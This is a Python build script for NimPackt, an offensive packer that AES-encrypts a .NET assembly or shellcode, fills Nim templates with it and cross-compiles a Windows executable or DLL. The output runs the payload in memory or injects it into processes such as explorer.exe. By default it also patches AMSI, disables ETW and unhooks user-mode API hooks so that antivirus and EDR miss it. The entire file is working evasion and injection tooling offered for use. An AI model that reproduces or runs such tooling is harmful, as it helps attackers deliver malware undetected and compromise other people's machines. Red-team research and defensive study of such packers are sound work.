#!/usr/bin/python3

  #-----
  #
  #   NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
  #   By Cas van Cooten (@chvancooten)
  #
  #   This script formats the .NET bytecode and compiles the nim code.
  #   For usage please refer to README.md
  #
  #-----
  #
  #   References:
  #
  #       Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim
  #
  #
  #       Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
  #       https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
  #
  #-----

import sys
import argparse
import binascii
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util import Counter

scriptDir = os.path.dirname(__file__)
templateDir = os.path.join(scriptDir, "templates")
outDir = os.path.join(scriptDir, "output")

### Base64 deprecated for AES encryption
# def base64EncodeInputFile(inFilename):
#     ### Deprecated code WITHIN deprecated code, how about that?!
#     # Construct the Nim bytearray in the right format
#     # Example: var buf: array[8, byte] = [byte 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00]
#     # outFilename = inFilename + ".nimByteArray"

#     # if os.path.exists(outFilename):
#     #     print(f"File '{outFilename}' already exists, using bytearray from this file...")
#     #     with open(outFilename,'r') as outFile:
#     #         return outFile.read()

#     if not os.path.exists(inFilename):
#         raise SystemExit("ERROR: Input file is not valid.")

#     print("Encoding binary to embed...")
#     with open(inFilename,'rb') as inFile:
#         blob_data = bytearray(inFile.read())

#         ### DEPRECATED - Below code embeds the plaintext bytestring which can be fingerprinted
#         #result = f"let buf: array[{len(blob_data)}, byte] = [byte "
#         #result = result + ",".join ([f"{x:#0{4}x}" for x in blob_data])
#         #result = result + "]"
#         #
#         #with open(outFilename, 'w') as outFile:
#         #    outFile.write(result)
#         #    print(f"Wrote Nim bytestring to '{outFilename}'.")

#         result = f"let b64buf = \"{str(base64.b64encode(blob_data), 'utf-8')}\""

#     return result

def int_of_string(s):
    return int(binascii.hexlify(s), 16)

def encrypt_message(key, iv, plaintext):
    ctr = Counter.new(128, initial_value=int_of_string(iv))
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    return iv + aes.encrypt(plaintext)

def cryptFiles(inFilename, unhookApis, x64):
    if not os.path.exists(inFilename):
        raise SystemExit("ERROR: Input file is not valid.")

    print("Encrypting binary to embed...")
    with open(inFilename,'rb') as inFile:
        plaintext = inFile.read()
        key =  os.urandom(16) # AES-128, so 16 bytes
        iv = os.urandom(16)
        ciphertext = encrypt_message(key, iv, plaintext)

        # Pass the encrypted string, skipping the IV portion
        cryptedInput = f"let b64buf = \"{str(base64.b64encode(ciphertext[16:]), 'utf-8')}\""

        # Define as bytearray to inject in Nim source code
        cryptIV = f"let cryptIV: array[{len(iv)}, byte] = [byte "
        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in iv])
        cryptIV = cryptIV + "]"

        # cryptKey is defined as a const to place it at a different spot in the binary
        cryptKey = f"const cryptKey: array[{len(key)}, byte] = [byte "
        cryptKey = cryptKey + ",".join ([f"{x:#0{4}x}" for x in key])
        cryptKey = cryptKey + "]"

    if unhookApis:
        if x64:
            with open(os.path.join(scriptDir, 'dist/shellycoat_x64.bin'),'rb') as coatFile:
                plaintext = coatFile.read()
                cipherCoat = encrypt_message(key, iv, plaintext)
                cryptedCoat = f"let cryptedCoat = \"{str(base64.b64encode(cipherCoat[16:]), 'utf-8')}\""
        else:
            raise SystemExit("ERROR: Bypassing user-mode API hooks is not supported in 32-bit mode.")
    else:
        cryptedCoat = "let cryptedCoat = \"\"" # This implies disabling UM API unhooking

    return cryptedInput, cryptedCoat, cryptIV, cryptKey

def parseArguments(inArgs):
    # Construct the packed arguments in the right format (array split on space)
    if not inArgs:
        result = 'let arr = toCLRVariant([""], VT_BSTR)'
    elif inArgs == "PASSTHRU":
        result = 'let arr = toCLRVariant(commandLineParams(), VT_BSTR)'
    else:
        parsedArgs = inArgs.split(" ")
        parsedArgs = ', '.join('"{0}"'.format(w.replace('\\', '\\\\')) for w in parsedArgs)
        result = f'let arr = toCLRVariant([{parsedArgs}], VT_BSTR)'

    return result
        
def generateSource_ExecuteAssembly(fileName, fileType, cryptedInput, cryptedCoat, cryptIV, cryptKey, argString, disableAmsi, disableEtw, verbose):
    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
    if fileType == "exe":
        filenames = ["NimPackt-Template-Base-Exe.nim", "NimPackt-Template-ExecuteAssembly.nim"]
    elif fileType == "dll":
        filenames = ["NimPackt-Template-Base-Dll.nim", "NimPackt-Template-ExecuteAssembly.nim", "NimPackt-Template-Footer-Dll.nim"]
    else:
        raise SystemExit("ERROR: Argument 'filetype' is not valid. Please specify either of 'dll' or 'exe'.")

    result = ""
    for fname in filenames:
        with open(os.path.join(templateDir, fname),'r') as templateFile:
            for line in templateFile:
                new_line = line.rstrip()
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
                result += new_line +"\n"

    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFilename, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFilename

def generateSource_Shinject(fileName, fileType, cryptedInput, cryptedCoat, cryptIV, cryptKey, disableAmsi, disableEtw, verbose):
    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
    if fileType == "exe":
        filenames = ["NimPackt-Template-Base-Exe.nim", "NimPackt-Template-Shinject.nim"]
    elif fileType == "dll":
        filenames = ["NimPackt-Template-Base-Dll.nim", "NimPackt-Template-Shinject.nim", "NimPackt-Template-Footer-Dll.nim"]
    else:
        raise SystemExit("ERROR: Argument 'filetype' is not valid. Please specify either of 'dll' or 'exe'.")

    result = ""
    for fname in filenames:
        with open(os.path.join(templateDir, fname),'r') as templateFile:
            for line in templateFile:
                new_line = line.rstrip()
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                result += new_line +"\n"

    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ShinjectNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFilename, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFilename

def generateSource_RemoteShinject(fileName, fileType, cryptedInput, cryptedCoat, cryptIV, cryptKey, disableAmsi, disableEtw, verbose, injecttarget, existingprocess):
    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
    if fileType == "exe":
        filenames = ["NimPackt-Template-Base-Exe.nim", "NimPackt-Template-RemoteShinject.nim"]
    elif fileType == "dll":
        filenames = ["NimPackt-Template-Base-Dll.nim", "NimPackt-Template-RemoteShinject.nim", "NimPackt-Template-Footer-Dll.nim"]
    else:
        raise SystemExit("ERROR: Argument 'filetype' is not valid. Please specify either of 'dll' or 'exe'.")

    result = ""
    for fname in filenames:
        with open(os.path.join(templateDir, fname),'r') as templateFile:
            for line in templateFile:
                new_line = line.rstrip()
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                new_line = new_line.replace('#[ PLACEHOLDERINJECTCALL ]#', f"injectShellcodeRemote(decodedPay, \"{injecttarget}\", {str(existingprocess).lower()})")
                result += new_line +"\n"

    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFilename, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFilename

def compileNim(fileName, fileType, hideApp, x64, debug):
    # Compile the generated Nim file for Windows (cross-compile if run from linux)
    # Compilation flags are focused on stripping and optimizing the output binary for size
    if x64:
        cpu = "amd64"
    else:
        cpu = "i386"
    
    if hideApp:
        gui = "gui"
    else:
        gui = "console"

    try:
        compileCommand = f"nim c -d:danger -d:strip -d:release --hints:off --warnings:off --opt:size --passc=-flto --passl=-flto --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu}"
        
        if fileType == "dll":
            compileCommand = compileCommand + " --app=lib --nomain"
            outFileName = os.path.splitext(fileName)[0] + ".dll"
        else:
            outFileName = os.path.splitext(fileName)[0] + ".exe"

        if os.name == 'nt':
            # Windows
            print("Compiling Nim binary (this may take a while)...")
        else:
            # Other (Unix)
            print("Cross-compiling Nim binary for Windows (this may take a while)...")
            compileCommand = compileCommand + " -d=mingw"

        compileCommand = compileCommand + f" {fileName}"
        os.system(compileCommand)
    except:
        e = sys.exc_info()[0]
        raise SystemExit(f"There was an error compiling the binary: {e}")

    if not debug:
        os.remove(fileName)
    
    print(f"Compiled Nim binary to {outFileName}!")
    if fileType == "dll":
        print(f"Trigger dll by calling 'rundll32 {os.path.basename(outFileName)},Update'")
    print("Go forth and make a Nimpackt that matters \N{smiling face with sunglasses}")
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    assembly = parser.add_argument_group('execute-assembly arguments')
    injection = parser.add_argument_group('shinject arguments')
    optional = parser.add_argument_group('other arguments')

    required.add_argument('-e', '--executionmode', action='store', dest='executionmode', help='Execution mode of the packer. Supports "execute-assembly" or "shinject"', required=True)
    required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable (.exe) or shellcode (.bin) to wrap', required=True)
    assembly.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
    injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
    injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
    injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
    optional.add_argument('-f', '--filetype', action='store', default="exe", dest='filetype', help='Filetype to compile ("exe" or "dll", default: "exe")')
    optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
    optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) of executable by compiling it in GUI mode')
    optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks')
    optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI) (recommended for shellcode)')
    optional.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW) (recommended for shellcode)')
    optional.add_argument('-d', '--debug', action='store_true', default=False, dest='debug', help='Enable debug mode (retains .nim source file in output folder).')
    optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
    optional.add_argument('-V', '--version', action='version', version='%(prog)s 0.9 Beta')

    args = parser.parse_args()

    if args.executionmode == "shinject" and args.arguments not in ["", "PASSTHRU"]:
        print("WARNING: Execute-assembly arguments (-a) will be ignored in 'shinject' mode.")

    if args.executionmode == "execute-assembly" and (args.localinject == False or args.injecttarget != "explorer.exe" or args.existingprocess == True):
        print("WARNING: Shinject arguments (-r, -t, and -E) will be ignored in 'execute-assembly' mode.")

    if args.executionmode == "shinject" and args.existingprocess == True:
        print("WARNING: ⚠ Injecting into existing processes is VERY volatile and is likely to CRASH the target process in its current state. DO NOT USE IN PRODUCTION ⚠")

    if args.executionmode == "execute-assembly" and args.filetype == "dll":
        print("WARNING: DLL files will not show console output. Make sure to pack your assembly with arguments to write to output file if you want the output :)")

    if args.x64 == False:
        print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case.")

    if args.executionmode == "shinject" and (args.injecttarget != "explorer.exe" or args.existingprocess == True):
        args.localinject = False

    cryptedInput, cryptedCoat, cryptIV, cryptKey = cryptFiles(args.inputfile, args.unhookApis, args.x64)

    argString = parseArguments(args.arguments)

    if args.executionmode == "execute-assembly":
        sourceFile = generateSource_ExecuteAssembly(args.inputfile, args.filetype, cryptedInput, cryptedCoat,
            cryptIV, cryptKey, argString, args.patchAmsi, args.disableEtw, args.verbose)
    elif args.executionmode == "shinject" and args.localinject == True:
        sourceFile = generateSource_Shinject(args.inputfile, args.filetype, cryptedInput, cryptedCoat,
             cryptIV, cryptKey, args.patchAmsi, args.disableEtw, args.verbose)
    elif args.executionmode == "shinject" and args.localinject == False:
        sourceFile = generateSource_RemoteShinject(args.inputfile, args.filetype, cryptedInput, cryptedCoat,
             cryptIV, cryptKey, args.patchAmsi, args.disableEtw, args.verbose, args.injecttarget, args.existingprocess)
    else:
        raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either of 'execute-assembly', 'shinject', or 'shinject-remote'.")

    compileNim(sourceFile, args.filetype, args.hideApp, args.x64, args.debug)